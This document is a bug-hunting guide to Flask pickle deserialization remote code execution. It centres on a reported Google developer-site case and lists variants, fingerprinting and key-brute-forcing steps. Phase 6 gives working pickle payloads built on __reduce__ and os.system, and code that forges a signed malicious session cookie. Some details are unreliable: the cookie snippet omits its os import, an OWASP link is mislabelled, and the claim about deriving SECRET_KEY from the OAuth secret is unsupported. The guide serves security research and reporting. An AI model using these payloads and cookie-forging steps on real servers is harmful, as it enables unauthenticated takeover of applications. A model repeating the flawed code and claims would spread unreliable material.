# Flask Session Pickle Deserialization RCE — Bug Class Analysis & Hunting Guide

**Bug Class:** CWE-502 — Deserialization of Untrusted Data
**Variant:** Python `pickle.loads()` via Flask session/cache infrastructure
**Reference Case:** Simon Koeck's $90,000 RCE on Google Developer Sites (developers.google.com)

---

## 1. What This Bug Class Is

Flask applications that use Python's `pickle` module to serialize/deserialize session data or cached objects are vulnerable to Remote Code Execution. `pickle.loads()` executes arbitrary Python code during deserialization — this is by design, not a bug in pickle itself.

The attack chain requires two ingredients:

| Ingredient | What it means |
|---|---|
| **A deserialization sink** | The app calls `pickle.loads()` on data the attacker can influence (session cookie, cache entry, filesystem session file) |
| **A delivery mechanism** | The attacker can get their crafted pickle payload to that sink (forged cookie via leaked secret key, cache poisoning, file write primitive) |

---

## 2. The Google DevSite Case (Simon Koeck)

### What happened

Google's developer documentation sites (developers.google.com and six sibling domains) ran Flask with server-side session handling. The exploitation chain:

1. **Recon:** Hitting the `/oauth2authorize` endpoint set a Flask session cookie — no authentication required.
2. **Cookie inspection:** Flask session cookies are **signed but not encrypted**. Base64-decoding the cookie revealed its contents in plaintext.
3. **Secret key leak:** The decoded cookie contained a pickled `OAuth2WebServerFlow` object that included the **Google OAuth client_id AND client_secret in plaintext**. With the client secret, the attacker could also recover or derive the Flask `SECRET_KEY` used to sign cookies.
4. **Forged cookie with malicious pickle:** Knowing the signing key, the attacker crafted a new session cookie containing a malicious pickle payload (e.g., `os.system("id")`), signed it with the recovered key, and sent it to the server.
5. **RCE trigger:** The server validated the signature (it matched), then called `pickle.loads()` on the cookie contents — executing the attacker's payload.

### Why it was $90,000

- Affected **seven Google domains** (the developer sites share infrastructure)
- Full **unauthenticated RCE** — no Google account needed
- The `/oauth2authorize` endpoint was publicly accessible

---

## 3. Real-World Variants of This Bug Class

### Variant A: Leaked / Weak / Default SECRET_KEY + Pickle Session Serializer

**Examples:** Apache Superset (default key `CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET`), countless Flask apps with hardcoded keys

**Chain:**
1. Find or guess the `SECRET_KEY`
2. Forge a session cookie with a pickle payload
3. Send it — server deserializes → RCE

**How the key leaks:**
- Hardcoded in source code (check GitHub, leaked repos)
- Default value never changed (Superset, Airflow, older Flask tutorials)
- Exposed via debug endpoints (`/config`, Sentry debug mode, `FLASK_DEBUG=1` error pages)
- Leaked inside the session cookie itself (the Google case)
- Brute-forced (tools: `flask-unsign`)

### Variant B: File Write Primitive + Filesystem Session Store

**Examples:** pyLoad (CVE-2026-35464)

**Chain:**
1. Find a feature that lets you write files to disk (download directory config, file upload, etc.)
2. Determine the Flask filesystem session directory (default: `flask_session/`)
3. Compute the session filename: `md5("session:" + <your_session_id>)`
4. Write your pickle payload to that path
5. Send a request with the corresponding session cookie → `pickle.loads()` fires

### Variant C: Cache Poisoning (Memcached/Redis) + Flask-Caching

**Chain:**
1. Find a CRLF injection or direct access to the cache backend (Memcached on port 11211, unauthenticated Redis)
2. Write a pickle payload to a cache key the app will read
3. When the app fetches and deserializes the cache entry → RCE

### Variant D: Pickle in Non-Session Contexts

Flask apps may also use pickle in:
- Job queues (Celery with pickle serializer)
- ML model loading (`torch.load()`, `joblib.load()`)
- Custom API endpoints that accept pickled data
- Database BLOBs deserialized on read

---

## 4. How to Hunt for This Bug

### Phase 1: Identify Flask Targets

**Fingerprinting signals:**
- Response headers: `Server: Werkzeug`, `X-Powered-By: Flask`
- Default error pages with Werkzeug tracebacks
- Session cookie name: default is `session` (but configurable)
- Session cookie format: starts with `eyJ` (base64-encoded JSON) for itsdangerous, or `.eJy` / opaque base64 for pickle-backed
- `/static/` directory structure, Jinja2 template error messages
- `Set-Cookie` with `HttpOnly; Path=/` after hitting any endpoint

**Tools:**
- `Wappalyzer` / `WhatRuns` browser extensions
- `httpx -tech-detect` for bulk scanning
- Manual header inspection with `curl -v`

### Phase 2: Decode the Session Cookie

```bash
# Install flask-unsign
pip install flask-unsign

# Decode without knowing the key (reads the signed payload)
flask-unsign --decode --cookie '<cookie_value>'

# Check if it's pickle-based vs JSON-based
# Pickle cookies often contain binary data or Python object references
# JSON cookies decode to readable {"key": "value"} dicts
python3 -c "
import base64, zlib
cookie = '<cookie_value_before_the_dot>'
# Try standard base64
try:
    data = base64.urlsafe_b64decode(cookie + '==')
    # Try zlib decompression (Flask compresses large cookies)
    try:
        data = zlib.decompress(data)
    except:
        pass
    print(data)
except Exception as e:
    print(f'Decode error: {e}')
"
```

**What to look for in decoded cookies:**
- Python object references (`__class__`, `__module__`, `__reduce__`)
- OAuth credentials (client_id, client_secret)
- Internal paths, hostnames, or config values
- Anything that looks like serialized Python objects rather than flat JSON

### Phase 3: Test for Weak/Known SECRET_KEY

```bash
# Try common/default keys
flask-unsign --unsign --cookie '<cookie>' --wordlist /path/to/wordlist.txt

# Common default keys to try:
# - "secret"
# - "dev"
# - "change_me"
# - "CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET" (Superset)
# - "temporary_key"
# - "your-secret-key"
# - The app name itself
# - Empty string ""

# If you find the key, verify by re-signing:
flask-unsign --sign --cookie "{'user': 'test'}" --secret '<found_key>'
```

### Phase 4: Determine the Serialization Backend

Even with a valid key, RCE requires the app to use `pickle` for deserialization. Default Flask uses `itsdangerous` with JSON — safe from pickle RCE.

**Indicators of pickle-based sessions:**
- Cookie decodes to binary (not JSON)
- `pickletools.dis()` produces valid opcode output
- App uses `Flask-Session` with `SESSION_TYPE = 'filesystem'` or `'redis'` or `'memcached'`
- App uses `Flask-Caching` with default serializer
- App has a custom `SessionInterface` that calls `pickle.loads()`
- Source code contains `session_serializer = pickle` or similar

```python
# Test if decoded data is valid pickle
import pickle, pickletools, io
data = b'<decoded_cookie_bytes>'
try:
    pickletools.dis(io.BytesIO(data))
    print("[!] Valid pickle data — potential RCE vector")
except:
    print("[-] Not pickle format")
```

### Phase 5: Check for Alternative Delivery Mechanisms

If the session cookie isn't pickle-based, look for other paths:

**File write primitives:**
- File upload features (can you control the destination directory?)
- Configuration options that set file paths (download dirs, log dirs, export dirs)
- Path traversal in any file-writing functionality
- Symlink following

**Cache access:**
- Is Memcached (11211) or Redis (6379) exposed without auth?
- SSRF that can reach internal cache services?
- CRLF injection in values stored to cache?

**Source code review patterns (if white-box):**
```bash
# Find pickle usage
grep -rn "pickle\.loads\|pickle\.load\|cPickle\.loads\|cPickle\.load" .
grep -rn "shelve\.open\|joblib\.load\|torch\.load\|yaml\.load" .

# Find Flask session configuration
grep -rn "SESSION_TYPE\|SESSION_SERIALIZER\|SECRET_KEY" .
grep -rn "FileSystemCache\|MemcachedCache\|RedisCache" .

# Find session interface implementations
grep -rn "SessionInterface\|session_interface\|open_session\|save_session" .
```

### Phase 6: Craft and Deliver the Payload

**Standard pickle RCE payload (authorized testing only):**

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        # Use a safe canary command for PoC
        return (os.system, ("id > /tmp/pwned",))

payload = pickle.dumps(RCE())
```

**For cookie-based delivery (requires SECRET_KEY):**

```python
from itsdangerous import URLSafeTimedSerializer
import pickle

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

# Sign the malicious cookie
s = URLSafeTimedSerializer(
    secret_key='<recovered_key>',
    salt='cookie-session',
    serializer=pickle  # or the custom serializer the app uses
)
cookie = s.dumps({'payload': RCE()})
print(cookie)
```

---

## 5. Detection Signals & Recon Checklist

| Signal | Priority | How to check |
|---|---|---|
| Flask/Werkzeug in response headers | High | `curl -sI <target>` |
| Session cookie is not JSON (binary/pickle) | Critical | Decode and inspect |
| Known/default SECRET_KEY | Critical | `flask-unsign --unsign` with wordlist |
| SECRET_KEY in source code or config leaks | Critical | GitHub dorking, config endpoints |
| `Flask-Session` with filesystem/redis/memcached | High | Source review, directory listing |
| Exposed Memcached/Redis (no auth) | High | Port scan 11211, 6379 |
| File upload with controllable destination | High | Test path traversal |
| `/oauth2authorize` or similar OAuth endpoints | Medium | Directory brute, spider |
| Debug mode enabled (`FLASK_DEBUG=1`) | High | Trigger an error, check for interactive debugger |
| Sentry/error tracking with config exposure | Medium | Check error pages for stack traces |

---

## 6. Key Tools

| Tool | Purpose |
|---|---|
| `flask-unsign` | Decode, brute-force, and forge Flask session cookies |
| `pickletools` (stdlib) | Disassemble pickle bytecode to inspect payloads |
| `nodesession` / `cookie-monster` | Generic session cookie analysis |
| `Burp Suite` | Intercept and modify cookies in-flight |
| `httpx` / `nuclei` | Bulk fingerprinting and template-based scanning |
| `SecretFinder` / `trufflehog` | Find leaked keys in JS files, repos, configs |

---

## 7. Remediation Patterns (for reporting)

1. **Never use `pickle` for session serialization** — use JSON via `itsdangerous` (Flask default) or `msgpack`
2. **Generate a strong random SECRET_KEY** — `python3 -c "import secrets; print(secrets.token_hex(32))"`
3. **Never embed secrets in session cookies** — the Google bug leaked OAuth client_secret inside the cookie
4. **If using Flask-Session, set** `SESSION_SERIALIZER` to a JSON-based serializer
5. **If using Flask-Caching, configure** a non-pickle serializer (`json`, `msgspec`)
6. **Restrict file-write primitives** — validate destination directories against allowlists, not blocklists
7. **Authenticate and firewall cache backends** — Memcached and Redis should never be exposed

---

## References

- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- OWASP Deserialization: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Incoming_Requests
- Flask-Unsign: https://github.com/Paradoxis/Flask-Unsign
- Python pickle docs (security warning): https://docs.python.org/3/library/pickle.html
